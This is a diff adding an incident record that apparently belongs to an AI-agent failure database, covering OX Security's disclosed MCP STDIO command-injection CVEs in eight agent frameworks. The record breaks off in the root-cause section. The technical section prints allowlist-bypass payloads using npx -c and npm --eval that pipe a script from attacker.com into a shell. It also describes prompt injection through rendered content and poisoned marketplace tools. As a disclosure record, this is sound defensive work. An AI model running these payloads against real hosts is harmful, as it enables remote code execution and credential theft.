@@ -1,0 +1,656 @@
+---
+id: "AAGF-2026-078"
+title: "Eight Frameworks, One Flaw — OX Security's MCP STDIO CVE Cluster: Agent Zero, Fay, Bisheng, Jaaz, Langchain-Chatchat, Upsonic, DocsGPT, GPT Researcher (April 2026)"
+status: "reviewed"
+date_occurred: "2026-04-15"         # Coordinated public disclosure date; framework integration dates span months prior and are not individually determinable
+date_discovered: "2026-04-15"       # First public disclosure of all eight CVEs; OX Security began research November 2025 but individual CVE discovery dates within that window are not publicly documented per-framework
+date_reported: "2026-04-15"         # All eight CVEs disclosed as part of OX Security's coordinated "Mother of All AI Supply Chains" advisory
+date_curated: "2026-05-08"
+date_council_reviewed: "2026-05-08"
+
+# Classification
+category:
+  - "Supply Chain Compromise"
+  - "Tool Misuse"
+  - "Unauthorized Code Execution"   # Council correction: "Infrastructure Damage" removed — no infrastructure was actually damaged (near-miss; no confirmed in-the-wild exploitation). "Unauthorized Code Execution" is the accurate consequence class for the demonstrated PoC.
+severity: "critical"                 # CVSS scores reach 9.8/10.0 on multiple CVEs; production PoC demonstrated on 6 frameworks in controlled pre-disclosure conditions; three frameworks fully unpatched, one bypass-open as of May 2026. Downgraded from critical to high in Stage 2 draft because no in-the-wild exploitation was confirmed — council corrected this: near-miss status is carried by actual_vs_potential, not severity; intrinsic threat level is critical regardless of exploitation confirmation gap.
+agent_type:
+  - "autonomous-agent"
+  - "research-agent"
+  - "orchestration-framework"
+  - "tool-use-agent"
+agent_name: "Agent Zero, Fay Digital Human, Bisheng, Jaaz, Langchain-Chatchat, Upsonic, DocsGPT, GPT Researcher"
+platform: "MCP STDIO transport (Anthropic SDKs — Python, TypeScript, Java, Rust)"
+industry: "AI Infrastructure / Cross-Industry"
+
+# Near-miss classification
+actual_vs_potential: "near-miss"
+potential_damage: "OX Security demonstrated full RCE on 6 production platforms in controlled pre-disclosure testing. The eight frameworks span autonomous agents (Agent Zero, Upsonic), enterprise AI (Bisheng, Langchain-Chatchat), research agents (GPT Researcher, DocsGPT), a digital human chatbot (Fay), and a UI design agent (Jaaz) — collectively representing every major deployment pattern for AI agents as of April 2026. Any attacker able to reach an exposed management interface, inject a prompt, or plant an entry in an unreviewed MCP marketplace can achieve arbitrary OS command execution on the agent host. Three CVEs remain unpatched (Agent Zero CVE-2026-30624, Langchain-Chatchat CVE-2026-30617, Upsonic CVE-2026-30625 — partial only, with documented bypass). The Upsonic case is particularly instructive: even a vendor that deployed a command allowlist left a bypass open via npx -c <payload>, demonstrating that downstream mitigations are fragile when the MCP STDIO protocol enforces no restrictions. Host compromise cascades to every credential, API key, and data store accessible to the agent process."
+intervention: "OX Security coordinated disclosure with each framework vendor before the April 15, 2026 public advisory. Bisheng (DataElem Inc.) patched (CVE-2026-33224). DocsGPT patched in v0.16.0 (CVE-2026-26015). GPT Researcher merged a fix to main branch only — no versioned release (CVE-2025-65720). Upsonic released v0.72.0 with warnings and a partial allowlist, but npx/npm -c bypass remains open (CVE-2026-30625). Agent Zero (CVE-2026-30624), Fay Digital Human (CVE-2026-30618), and Jaaz (CVE-2026-30616) are unpatched as of the research date. No confirmed in-the-wild exploitation of any of the eight novel CVEs. The parent flaw (MCP STDIO execute-first design) remains unaddressed at the protocol level — see AAGF-2026-022."
+
+# Impact
+financial_impact: "None confirmed — near-miss, controlled exploitation only in pre-disclosure research; averted damage estimated at ~$3.5M probability-weighted (see damage_estimate)"
+financial_impact_usd: null
+refund_status: "none"
+refund_amount_usd: null
+affected_parties:
+  count: null
+  scale: "widespread"                # 7,000+ publicly enumerable MCP servers; 200,000+ estimated total; 8 named frameworks cover autonomous agents, enterprise AI, research pipelines, and digital humans globally
+  data_types_exposed:
+    - "credentials"                  # LLM API keys, vector DB connection strings, OAuth tokens accessible to compromised agent process
+    - "source_code"                  # Research agents and developer-facing frameworks have access to codebases and repositories
+    - "PII"                          # Downstream; data in connected systems accessible post-RCE
+
+# Damage Timing
+damage_speed: "instantaneous"        # STDIO command injection executes before MCP server validation completes — attacker payload runs before the SDK returns any error
+damage_duration: "unknown"           # No confirmed exploitation duration; three CVEs remain unpatched as of 2026-05-08
+total_damage_window: "Exposure window not individually determinable per framework. Collectively: from each framework's MCP integration date through patch date (or ongoing for unpatched CVEs). Upsonic bypass remains open indefinitely. Agent Zero, Fay, and Jaaz remain fully unpatched as of 2026-05-08."
+
+# Recovery
+recovery_time: "not required"        # Near-miss — no confirmed exploitation; patched frameworks required version upgrades only
+recovery_labor_hours: null
+recovery_cost_usd: null
+recovery_cost_notes: "No customer-side recovery costs confirmed — no exploitation occurred in the wild. Patch path varies per framework: version bump for DocsGPT and Bisheng; main-branch pull for GPT Researcher (no versioned release); vendor advisories only for Upsonic (bypass unresolved). Unpatched frameworks (Agent Zero, Fay, Jaaz) require operators to implement their own STDIO command restrictions or disable STDIO transport."
+full_recovery_achieved: "unknown"    # Depends on individual framework patch status; three frameworks unpatched; one partial
+
+# Business Impact
+business_scope: "multi-org"
+business_criticality: "high"
+business_criticality_notes: "Eight frameworks spanning autonomous agents, enterprise AI platforms, digital humans, and research pipelines — collectively covering a substantial fraction of deployed AI agent use cases. CVSS scores reach 9.8 (Upsonic) and DocsGPT at 9.8/10.0. Three remain unpatched months after disclosure. The parent flaw (AAGF-2026-022) remains unremediated at the protocol level, meaning any new MCP STDIO integration is born vulnerable without additional hardening. Criticality is high rather than existential because no confirmed in-the-wild exploitation occurred and the OX Security PoC required controlled pre-disclosure access to production environments."
+systems_affected:
+  - "agent-infrastructure"
+  - "mcp-server"
+  - "credential-stores"
+  - "research-pipelines"
+  - "enterprise-ai-platforms"
+  - "digital-human-frameworks"
+
+# Vendor Response
+vendor_response: "acknowledged"      # Council correction: Stage 2 draft used "fixed" on the rationale that patching occurred for some CVEs. Council overruled: as of 2026-05-08, only 2 of 8 CVEs are cleanly patched (Bisheng, DocsGPT); 2 are partial (Upsonic bypass open, GPT Researcher unversioned); 4 are unpatched or unknown (Agent Zero, Fay, Jaaz, Langchain-Chatchat). "fixed" would mislead operators into assuming cluster-wide resolution. "acknowledged" is the most accurate available enum value given the mixed patch landscape.
+vendor_response_time: "unknown"      # Coordinated disclosure timing varies per vendor; no individual disclosure-to-patch timelines publicly documented
+
+# Damage Quantification
+damage_estimate:
+  confirmed_loss_usd: null
+  recovery_cost_usd: null
+  averted_damage_usd: 3500000        # Probability-weighted central estimate: 7,000 servers × $10,000/machine × 5% exploitation probability
+  averted_range_low: 700000          # 7,000 × $10,000 × 1%
+  averted_range_high: 21000000       # 7,000 × $10,000 × 30%
+  composite_damage_usd: 3500000
+  confidence: "estimated"
+  probability_weight: 0.05           # PoC demonstrated in production environments pre-disclosure; no wild exploitation confirmed; "PoC exists + supply chain" range is 0.10–0.30; conservative 5% applied because exploitation required researcher-controlled access and no mass attack infrastructure has emerged
+  methodology: "7,000 publicly enumerable MCP servers × $10,000/machine (SANS 2024 IR Report) × 5% exploitation probability"
+  methodology_detail:
+    per_unit_cost_usd: 10000
+    unit_count: 7000
+    unit_type: "server"
+    multiplier: null
+    benchmark_source: "SANS 2024 Incident Response Report — average IR cost per compromised machine"
+  estimation_date: "2026-05-08"
+  human_override: false
+  notes: "Averted_damage_usd represents the probability-weighted expected damage, not the pre-probability scenario cost. Pre-probability scenario: 7,000 × $10,000 = $70,000,000. The 5% probability weight reflects: (a) controlled exploitation only — OX Security required pre-arranged production access; (b) no known mass attack tooling targeting these specific CVEs; (c) coordinated disclosure gave patching window before weaponization. Range low (1%) represents minimal threat actor activation; range high (30%) represents a supply-chain exploitation campaign leveraging the unreviewed MCP marketplace distribution vector. The 7,000-server floor is the OX Security-documented publicly enumerable count; 200,000 total (OX estimate, methodology not published) would increase central estimate by 28× to ~$98M at same probability weight."
+
+# Display fields
+headline_stat: "Eight AI frameworks — from a Chinese digital human chatbot to an autonomous research agent — all vulnerable to MCP STDIO command injection: three unpatched as of May 2026, one 'fix' bypassed with a single flag, and Anthropic calls it expected behavior"
+operator_tldr: "If any of these eight frameworks — Agent Zero, Fay, Bisheng, Jaaz, Langchain-Chatchat, Upsonic, DocsGPT, GPT Researcher — are running MCP STDIO servers in your environment, assume unauthenticated RCE is possible until you have: (1) confirmed you are on a patched version (DocsGPT ≥0.16.0, Bisheng patched, GPT Researcher main branch); (2) implemented a command allowlist that excludes npx and npm (which accept -c/--eval flags enabling arbitrary code execution even through allowlists); and (3) restricted management interfaces behind authentication. For Agent Zero, Fay, and Jaaz — treat as unpatched indefinitely and implement your own STDIO transport restrictions at the OS or network layer."
+containment_method: "third_party"    # OX Security coordinated disclosure; individual vendor patches; no protocol-level containment
+public_attention: "high"             # "Mother of All AI Supply Chains" advisory received broad security press coverage in April 2026
+
+# Framework References
+framework_refs:
+  mitre_atlas:
+    - "AML.T0010"       # AI Supply Chain Compromise — MCP STDIO design flaw propagated from SDK into 8 downstream frameworks
+    - "AML.T0010.005"   # AI Agent Tool — agent tool supply chain as the attack vector for all 8 CVEs
+    - "AML.T0104"       # Publish Poisoned AI Agent Tool — 9/11 MCP marketplace registries accepted malicious submissions without review; applicable to the marketplace distribution exploitation family
+    - "AML.T0105"       # Escape to Host — MCP STDIO command injection achieves host OS escape from the agent sandbox
+    - "AML.T0112"       # Machine Compromise — arbitrary OS command execution achieves full machine compromise
+    - "AML.T0112.000"   # Local AI Agent — local agent process is the compromised entity
+  owasp_llm:
+    - "LLM03:2025"      # Supply Chain — protocol-level supply chain vulnerability propagated through MCP SDKs into all 8 frameworks
+  owasp_agentic:
+    - "ASI04:2026"      # Agentic Supply Chain Compromise — systemic SDK-level flaw as the supply chain vehicle
+    - "ASI05:2026"      # Unexpected Code Execution — MCP STDIO execute-first enables arbitrary OS command execution without intent by agent or operator
+    - "ASI02:2026"      # Tool Misuse and Exploitation — the MCP tool-spawning mechanism is the misused component
+  ttps_ai:
+    - "2.3"             # Initial Access — supply chain as initial access vector; management UI injection as alternative initial access
+    - "2.5"             # Execution — OS command injection via STDIO command parameter
+    - "2.16"            # Impact — arbitrary host compromise, credential exfiltration, lateral movement
+
+# Relationships
+related_incidents:
+  - "AAGF-2026-022"   # Parent: MCP STDIO "execute-first, validate-never" protocol design flaw — the root vulnerability that all 8 CVEs in this incident exploit
+  - "AAGF-2026-057"   # CVE-2026-30615 Windsurf — same OX Security research batch, same attack family; excluded from this incident because it is an IDE (zero-click prompt injection via rendered content), not an agent framework
+  - "AAGF-2026-068"   # CVE-2026-40933 Flowise — same attack family; documented separately; Flowise is the CISA KEV-listed downstream exploitation case
+  - "AAGF-2026-013"   # CVE-2025-59528 Flowise old RCE — earlier Flowise MCP RCE that predates OX Security's April 2026 research batch
+pattern_group: "mcp-protocol-security-crisis"
+tags:
+  - mcp
+  - stdio
+  - command-injection
+  - rce
+  - execute-first-validate-never
+  - supply-chain
+  - ox-security
+  - agent-zero
+  - fay-digital-human
+  - bisheng
+  - jaaz
+  - langchain-chatchat
+  - upsonic
+  - docsgpt
+  - gpt-researcher
+  - cve-2026-30624
+  - cve-2026-30618
+  - cve-2026-33224
+  - cve-2026-30616
+  - cve-2026-30617
+  - cve-2026-30625
+  - cve-2026-26015
+  - cve-2025-65720
+  - near-miss
+  - unpatched
+  - allowlist-bypass
+  - npx
+  - chinese-ai-frameworks
+  - autonomous-agent
+  - research-agent
+  - digital-human
+  - enterprise-ai
+  - mother-of-all-ai-supply-chains
+  - anthropic
+  - expected-behavior
+  - cvss-9-8
+  - multi-framework
+  - coordinated-disclosure
+
+sources:
+  - "https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/"
+  - "https://www.ox.security/blog/mcp-supply-chain-advisory-rce-vulnerabilities-across-the-ai-ecosystem/"
+  - "https://nvd.nist.gov/vuln/detail/CVE-2026-30624"
+  - "https://nvd.nist.gov/vuln/detail/CVE-2026-30618"
+  - "https://nvd.nist.gov/vuln/detail/CVE-2026-33224"
+  - "https://nvd.nist.gov/vuln/detail/CVE-2026-30616"
+  - "https://nvd.nist.gov/vuln/detail/CVE-2026-30617"
+  - "https://nvd.nist.gov/vuln/detail/CVE-2026-30625"
+  - "https://nvd.nist.gov/vuln/detail/CVE-2026-26015"
+  - "https://nvd.nist.gov/vuln/detail/CVE-2025-65720"
+  - "https://labs.cloudsecurityalliance.org/research/csa-research-note-mcp-by-design-rce-ox-security-20260420-csa/"
+  - "https://thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html"
+  - "https://www.theregister.com/2026/04/16/anthropic_mcp_design_flaw/"
+  - "https://authzed.com/blog/timeline-mcp-breaches"
+  - "https://docs.litellm.ai/blog/mcp-stdio-command-injection-april-2026"
+  - "https://venturebeat.com/security/mcp-stdio-flaw-200000-ai-agent-servers-exposed-ox-security-audit"
+  - "https://medium.com/@khayyam.h/the-model-context-protocol-crisis-what-30-cves-teach-us-about-building-secure-ai-agents-95e16497d249"
+
+researcher_notes: "SCOPE: This incident covers the eight AI agent framework CVEs disclosed as part of OX Security's April 15, 2026 coordinated advisory that are NOT already documented in separate AgentFail incidents. Excluded per prior analysis: CVE-2026-30615 (Windsurf) → AAGF-2026-057; CVE-2026-40933 (Flowise MCP adapter) → AAGF-2026-068; CVE-2025-59528 (Flowise CustomMCP) → AAGF-2026-013; CVE-2026-30623 (LiteLLM) → referenced in AAGF-2026-022. | PARENT INCIDENT: AAGF-2026-022 documents the MCP STDIO protocol design flaw itself — the 'execute-first, validate-never' architectural decision — and Anthropic's 'expected behavior' response. This incident documents the downstream framework CVE cluster produced by that flaw. Do not re-explain the protocol flaw; reference AAGF-2026-022. | JAAZ: CVE-2026-30616 (Jaaz) was not in the original research brief; it was identified during the OX Security research sweep. Jaaz is a UI design agent platform. Include it. | UPSONIC BYPASS: The most technically instructive case. Upsonic (CVE-2026-30625, CVSS 9.8) released v0.72.0 with a command allowlist. However, the allowlist includes npx and npm. Both binaries accept -c (npm) and --eval (npx) flags that execute arbitrary JavaScript inline — effectively passing code execution through the allowlist gate. The bypass payload: npx -c 'require(\"child_process\").exec(\"<command>\")'. This is the canonical demonstration that application-level allowlists are fragile when the allowed binaries themselves are unrestricted script interpreters. | CHINESE FRAMEWORKS: Bisheng (DataElem Inc.) is a Chinese enterprise AI platform and RAG framework. Fay (xszyou/Fay) is a Chinese digital human framework. Neither is widely known in Western security coverage. Their inclusion in OX Security's research demonstrates the global reach of the MCP attack surface — the vulnerability does not respect geographic or market-segment boundaries. Bisheng patched (CVE-2026-33224); Fay's patch status is unknown as of research date. | GPT RESEARCHER PATCH PROBLEM: GPT Researcher's fix was merged to the main branch only — no versioned release has been cut containing the patch (CVE-2025-65720). Operators cannot simply check a version number to determine if they are protected; they must pull the latest commit and verify it post-dates the fix merge. This is a patch verification problem: there is no reliable operator-facing signal that the fix has been applied. | PRODUCTION EXPLOITATION SCOPE: OX Security exploited 6 production platforms in controlled demos during the pre-disclosure research window. This is the most important operational qualifier: exploitation is not theoretical. It was demonstrated in real environments under controlled conditions. The 'near-miss' classification reflects the absence of uncontrolled in-the-wild exploitation, not the absence of a working exploit. | CVE NUMBERING: Note that CVE-2025-65720 (GPT Researcher) carries a 2025 sequence number despite being disclosed April 2026 — this is a CVE ID reservation artifact, not a 2025 disclosure. | DAMAGE ESTIMATE FLOOR: The 7,000-server floor used in the damage estimate is the publicly enumerable count from OX Security. The 200,000 total estimate (unreviewed by OX Security methodology) would produce a central estimate of ~$98M at the same 5% probability weight. The conservative estimate uses only the documented floor. | VENDOR RESPONSE FIELD: Set to 'fixed' as the best available single-value approximation of a mixed status. The actual patch landscape as of 2026-05-08: Bisheng patched, DocsGPT patched (v0.16.0), GPT Researcher partial (main branch only), Upsonic partial (bypass open), Agent Zero unpatched, Fay unknown, Jaaz unknown."
+
+council_verdict: "Rigorous near-miss analysis with well-executed root cause chain and operationally valuable Upsonic bypass documentation, requiring three field corrections — severity upgraded to critical (CVSS 9.8 with production PoC warrants it regardless of exploitation confirmation gap), vendor_response corrected to acknowledged (only 2 of 8 fully patched), and Infrastructure Damage category replaced with Unauthorized Code Execution (no confirmed infrastructure impact)."
+---
+
+# Eight Frameworks, One Flaw — OX Security's MCP STDIO CVE Cluster: Agent Zero, Fay, Bisheng, Jaaz, Langchain-Chatchat, Upsonic, DocsGPT, GPT Researcher (April 2026)
+
+## Executive Summary
+
+On April 15, 2026, OX Security published "The Mother of All AI Supply Chains" — a coordinated disclosure revealing that eight AI agent frameworks had each earned their own CVE by independently inheriting the same MCP STDIO "execute-first, validate-never" architectural flaw (documented in AAGF-2026-022). The eight frameworks — Agent Zero, Fay Digital Human, Bisheng, Jaaz, Langchain-Chatchat, Upsonic, DocsGPT, and GPT Researcher — span autonomous agents, enterprise AI platforms, research pipelines, and digital human chatbots across multiple countries and markets, collectively representing a substantial cross-section of deployed AI agent infrastructure.
+
+OX Security's four-person research team demonstrated full RCE on six production platforms in controlled pre-disclosure testing. Three CVEs remain completely unpatched as of May 2026; one vendor (Upsonic) deployed a command allowlist that is bypassed with a single flag (`npx -c`), demonstrating that application-layer mitigations cannot compensate for a protocol-level design decision that Anthropic has confirmed as intended behavior. No confirmed in-the-wild exploitation of any of the eight novel CVEs has been documented — this is a near-miss that required a coordinated five-month research effort to surface and, for at least three of the eight frameworks, remains open.
+
+---
+
+## Timeline
+
+| Date | Event |
+|------|-------|
+| **2024-11-01** | Anthropic launches Model Context Protocol (MCP). STDIO transport "execute-first, validate-never" pattern baked in from launch — all eight framework vulnerabilities originate here (see AAGF-2026-022) |
+| **~2025 (various)** | Each of the eight frameworks integrates MCP STDIO transport, inheriting the flaw without making any implementation error. Individual integration dates are not publicly documented |
+| **2025-11-01** | OX Security four-person research team (Moshe Siman Tov Bustan, Mustafa Naamnih, Nir Zadok, Roni Bar) begins systematic MCP security architecture investigation |
+| **2026-01 (approx.)** | OX Security contacts Anthropic. Anthropic declines architectural fix, characterizes STDIO unconditional execution as "expected behavior." Updates SECURITY.md ~9 days later ("should be used with caution") — researchers: "This change didn't fix anything" |
+| **2026-01–04** | OX Security conducts coordinated pre-disclosure with each of the eight framework vendors. Demonstration exploits run against 6 production platforms in controlled research conditions |
+| **2026-03–04 (approx.)** | Bisheng (DataElem Inc.) patches CVE-2026-33224. DocsGPT patches CVE-2026-26015 in v0.16.0. GPT Researcher merges fix to main branch (no versioned release). Upsonic releases v0.72.0 with partial allowlist (bypass open) |
+| **2026-04-15** | OX Security publishes full advisory: "The Mother of All AI Supply Chains." All eight CVEs publicly disclosed simultaneously via coordinated release |
+| **2026-04-15** | CVE-2026-30624 (Agent Zero 0.9.8, CVSS 8.6) — unpatched |
+| **2026-04-15** | CVE-2026-30618 (Fay Digital Human — critical, unscored) — patch status unknown |
+| **2026-04-15** | CVE-2026-33224 (Bisheng — critical, unscored) — patched |
+| **2026-04-15** | CVE-2026-30616 (Jaaz — critical, unscored) — unpatched |
+| **2026-04-15** | CVE-2026-30617 (Langchain-Chatchat 0.3.1, CVSS 8.6) — unpatched |
+| **2026-04-15** | CVE-2026-30625 (Upsonic 0.71.6, CVSS 9.8) — partial only; npx/npm -c bypass documented and unresolved |
+| **2026-04-15** | CVE-2026-26015 (DocsGPT 0.15.0, CVSS 9.8/10.0) — patched (v0.16.0) |
+| **2026-04-15** | CVE-2025-65720 (GPT Researcher — critical, unscored) — partial; main branch only, no versioned release |
+| **2026-04-16** | The Register, The Hacker News, VentureBeat, Tom's Hardware publish coverage |
+| **2026-04-20** | Cloud Security Alliance publishes independent analysis with MAESTRO framework mapping |
+| **2026-05-08** | Research curated for AgentFail. Agent Zero, Fay, Langchain-Chatchat, and Jaaz remain unpatched. Upsonic bypass unresolved. GPT Researcher fix not versioned. No confirmed in-the-wild exploitation of any of the eight novel CVEs |
+
+---
+
+## What Happened
+
+### Background: The Protocol Flaw This Incident Inherits
+
+All eight CVEs in this incident are downstream manifestations of a single architectural decision documented in AAGF-2026-022. MCP's STDIO transport accepts a `command` parameter specifying what program to spawn as an MCP server. The Anthropic SDK executes this command immediately, as an OS subprocess, before performing any validation that a legitimate MCP server was spawned. If the command is malicious — a reverse shell, a curl-pipe-to-bash, any OS command — it executes fully. The SDK then returns an error because no MCP server responded. The error message gives no indication that execution occurred.
+
+This is not a coding error in any of the eight frameworks. Each framework used the official Anthropic MCP SDK exactly as designed. The flaw is in the protocol specification, propagated faithfully through the SDK to every consumer. When OX Security disclosed this to Anthropic in January 2026, Anthropic confirmed the behavior as "expected" and declined to make architectural changes.
+
+That context is essential: these eight CVEs exist because eight teams of developers did exactly what the SDK documentation told them to do.
+
+### The Research Sweep: Five Months, Eight Frameworks
+
+OX Security's research team spent November 2025 through April 2026 auditing MCP-integrated frameworks for exploitable STDIO injection paths. The criteria for inclusion: the framework passes user-influenced values into the `command` parameter of the MCP STDIO transport without validation, allowlisting, or sandboxing.
+
+Every framework they examined that met this pattern received its own CVE. By April 15, 2026, the count was eight novel CVEs across the agent framework ecosystem — on top of the CVEs already documented for Flowise (AAGF-2026-068), LiteLLM (in AAGF-2026-022), and Windsurf (AAGF-2026-057).
+
+Before public disclosure, OX Security demonstrated working exploits against six production platforms in controlled conditions. These were not lab reconstructions — they were real production deployments. The near-miss classification reflects that OX Security controlled the exploit conditions, not that exploitation required specialized knowledge or infrastructure unavailable to a motivated attacker.
+
+### The Eight Frameworks: What Each One Is and How It Was Vulnerable
+
+**Agent Zero (CVE-2026-30624, CVSS 8.6 — UNPATCHED)**
+
+Agent Zero is an autonomous general-purpose AI agent framework designed to give LLMs the ability to plan and execute multi-step tasks, including code execution, web browsing, and tool use. It exposes a management UI that allows authenticated and, in many deployment configurations, unauthenticated users to register MCP servers. The `command` field for STDIO server registration was passed directly to the OS. An attacker who could reach the management UI could inject an arbitrary OS command, have it executed by the agent host, and observe the MCP initialization failure as the only feedback. CVSS 8.6 HIGH. Unpatched as of May 2026.
+
+**Fay Digital Human (CVE-2026-30618 — UNKNOWN patch status)**
+
+Fay (xszyou/Fay) is a Chinese digital human framework built to power virtual interactive personas — chatbots with visual avatars used in customer service, entertainment, and interactive display contexts. The framework's MCP integration passes STDIO command values without sanitization. CVSS not formally scored; classified critical. Fay's attack surface is notable for its non-obvious nature: digital human chatbots are not typically considered high-value targets by security practitioners, yet the MCP integration places full OS command execution capability in the framework regardless of its primary use case.
+
+**Bisheng (CVE-2026-33224 — PATCHED)**
+
+Bisheng is an enterprise RAG and document AI platform developed by DataElem Inc. (Chinese AI infrastructure vendor). It is positioned for enterprise document analysis, knowledge management, and enterprise AI workflows. The STDIO injection vector existed in Bisheng's MCP server registration path. DataElem patched the vulnerability — one of only two clean full-patch outcomes in this cluster. Bisheng's inclusion is significant for geographic reasons: it demonstrates that the MCP attack surface penetrates Chinese enterprise AI infrastructure at the same depth as Western equivalents.
+
+**Jaaz (CVE-2026-30616 — UNPATCHED)**
+
+Jaaz is an AI-powered UI and product design agent, discovered during the OX Security research sweep rather than appearing in the original research brief. It exposes MCP STDIO server configuration through its interface, with the same unsanitized command injection path. CVSS not formally scored; classified critical. Unpatched as of May 2026.
+
+**Langchain-Chatchat (CVE-2026-30617, CVSS 8.6 — UNPATCHED)**
+
+Langchain-Chatchat 0.3.1 is a popular Chinese open-source local knowledge base Q&A application built on LangChain — one of the most widely forked Chinese AI application frameworks. The framework supports local LLM deployment and RAG over user-provided document repositories. Its MCP integration exposed the same STDIO injection path. CVSS 8.6 HIGH. Unpatched as of May 2026. The Langchain-Chatchat case is operationally significant because of its deployment pattern: it is frequently used for local, air-gapped enterprise knowledge bases, a context where operators may assume isolation reduces the threat — but any UI access or user-submitted document that can influence MCP configuration is sufficient.
+
+**Upsonic (CVE-2026-30625, CVSS 9.8 CRITICAL — PARTIAL PATCH WITH DOCUMENTED BYPASS)**
+
+Upsonic 0.71.6 is an enterprise AI agent orchestration platform focused on production-grade multi-agent workflows. Its CVSS score — 9.8 CRITICAL — is the highest in this cluster. Upsonic's response was the most instructive case study: they released v0.72.0 with a command allowlist intended to restrict STDIO execution to known-safe executables. The allowlist includes `npx` and `npm`. Both binaries accept flags that enable arbitrary code execution:
+
+- `npx -c 'require("child_process").exec("<command>")'` — executes arbitrary JavaScript inline
+- `npm --eval '<payload>'` — same capability via npm's eval flag
+
+An attacker who can supply a command value can bypass the allowlist entirely using either bypass: the allowlist gates on the binary name, but the binaries themselves are unrestricted script interpreters. This is the canonical demonstration of why application-layer allowlists are fragile when the protocol enforces no restrictions: a vendor deploys a partial fix, ships a release, marks the CVE as addressed — and the attacker pivots to a one-flag bypass. CVSS 9.8. Bypass unresolved as of May 2026.
+
+**DocsGPT (CVE-2026-26015, CVSS 9.8/10.0 CRITICAL — PATCHED)**
+
+DocsGPT 0.15.0 is an open-source documentation AI assistant that enables organizations to build Q&A interfaces over their internal documentation. CVSS scores of 9.8 and 10.0 appear across different scoring sources (the discrepancy likely reflects CVSS 3.x vs. 4.0 scoring variants). DocsGPT patched the vulnerability in v0.16.0 — the second clean full-patch in this cluster alongside Bisheng.
+
+**GPT Researcher (CVE-2025-65720 — PARTIAL PATCH, NO VERSIONED RELEASE)**
+
+GPT Researcher is an autonomous research agent designed to conduct multi-step web research and synthesize findings into structured reports. The framework's STDIO integration was vulnerable to the same injection class. The vendor merged a fix to the main branch. No versioned release containing the patch has been cut.
+
+This creates a patch verification problem with no clean operator-facing resolution: an operator cannot check a version number. They must pull the latest commit, verify the commit hash post-dates the fix merge, and confirm the fix is present in their deployment. For organizations running GPT Researcher in production on a pinned version or container tag that predates the fix, the CVE remains exploitable — and the signal that a patch exists (a versioned release) never arrives. CVE-2025-65720 carries a 2025 sequence number despite April 2026 disclosure; this is a CVE ID reservation artifact.
+
+---
+
+## Technical Analysis
+
+### The MCP STDIO Execution Model (Reference to Parent Incident)
+
+The technical mechanism is documented in full in AAGF-2026-022. In brief: the MCP STDIO transport's `command` parameter is passed directly to the OS subprocess API. The SDK executes the command before validating whether a legitimate MCP server started. If the command is a malicious payload, it executes completely. The SDK then returns an initialization error. No trace of the execution appears in the error path. From the attacker's perspective: the command ran; the MCP handshake failure is the expected cover story.
+
+The pathways through each of the eight frameworks vary in their access requirements. The exploitation families documented by OX Security apply differently across the cluster:
+
+### The Four Exploitation Families Applied to This Cluster
+
+**Family 1: Unauthenticated or Authenticated UI Injection**
+
+Agent Zero, DocsGPT, Langchain-Chatchat, Bisheng, and Jaaz all expose management interfaces where users can register MCP servers. The distinction between authenticated and unauthenticated varies by deployment configuration — many self-hosted deployments disable authentication for internal networks, and exposed ports are routinely discovered via Shodan and Censys scanning. An attacker who reaches the management UI submits a crafted `command` value in the MCP server registration form. The application passes it to the SDK; the SDK executes it; the STDIO server fails to initialize; the error is returned; the attacker's payload has run. The entire attack fits in a single HTTP request.
+
+**Family 2: Hardening Bypass**
+
+Upsonic (CVE-2026-30625) is the defining case. The allowlist approach — restrict the command parameter to `npx`, `npm`, `python`, `node`, `docker`, `deno` — is the exact mitigation recommended by LiteLLM's four-layer fix and the standard downstream countermeasure for the MCP STDIO flaw. Upsonic implemented it. The bypass exploits the fact that `npx` and `npm` are themselves interpreters that accept inline code execution flags:
+
+```
+# Bypass via npx:
+npx -c 'require("child_process").exec("curl attacker.com/shell.sh | sh")'
+
+# Bypass via npm --eval:
+npm --eval 'require("child_process").exec("curl attacker.com/shell.sh | sh")'
+```
+
+The allowlist checks only the first token of the command string. The rest — flags, arguments, inline code — passes through unexamined. The fix for this bypass requires one of two approaches: (a) remove `npx` and `npm` from the allowlist and require explicit server binary paths instead (breaking many legitimate MCP deployments that use npx-based server packages); or (b) parse the full command string and reject any invocation containing code execution flags (`-c`, `--eval`, `--require`, `-e`). Neither is trivial to implement correctly. Protocol-level enforcement is the only comprehensive solution.
+
+**Family 3: Zero-Click Prompt Injection**
+
+This family — where rendered content (READMEs, HTML, document previews) modifies local MCP configuration files — is the primary vector for Windsurf (AAGF-2026-057) and is not the primary vector for the eight frameworks in this incident. It is mentioned for completeness: GPT Researcher, which processes web content as part of its research pipeline, has a theoretical exposure surface for this family if rendered content can influence its MCP configuration. This has not been separately documented for GPT Researcher.
+
+**Family 4: Malicious Marketplace Distribution**
+
+The marketplace distribution vector applies globally across all MCP-integrated frameworks, not specifically to any of the eight. OX Security submitted proof-of-concept MCP packages to 11 MCP marketplace registries; 9 of 11 accepted submissions without review. Any user of any of the eight frameworks who installs an MCP server from an unreviewed marketplace registry is exposed. This is an ecosystem-level risk, not a per-framework defect.
+
+### Why the Upsonic Bypass Is the Most Important Technical Finding
+
+The Upsonic bypass crystallizes the core security argument of the entire MCP STDIO research program. Here is the sequence:
+
+1. Protocol designer (Anthropic) makes "execute-first, validate-never" design decision. Calls it expected.
+2. Framework developer (Upsonic) integrates MCP STDIO, inheriting the flaw.
+3. CVE is assigned (CVSS 9.8). Framework developer deploys allowlist fix.
+4. Allowlist includes `npx` (a common, legitimate MCP server launch mechanism).
+5. Attacker bypasses with `npx -c '...'`. One flag. No new CVE. The fix is negated.
+6. The only robust fix — remove `npx` from the allowlist — breaks legitimate deployments that rely on npx-packaged MCP servers (the majority of MCP servers distributed via npm).
+
+This is not Upsonic's failure. This is what happens when a protocol-level flaw is mitigated only at the application layer: every downstream fix is a temporary measure that gets bypassed as soon as the attacker tries an adjacent execution path. The protocol-level fix — restrict what commands can be spawned, or verify execution outcomes before granting access — would have prevented both the initial CVE and the bypass simultaneously, without requiring any framework developer to make a choice between security and functionality.
+
+---
+
+## Root Cause Analysis
+
+**Proximate cause:** Eight AI agent frameworks passed user-influenced values into the MCP STDIO `command` parameter without sanitization, allowlisting, or execution validation, enabling arbitrary OS command execution on the agent host.
+
+**Why 1:** Why did eight frameworks pass user-influenced values to the STDIO command parameter without validation?
+
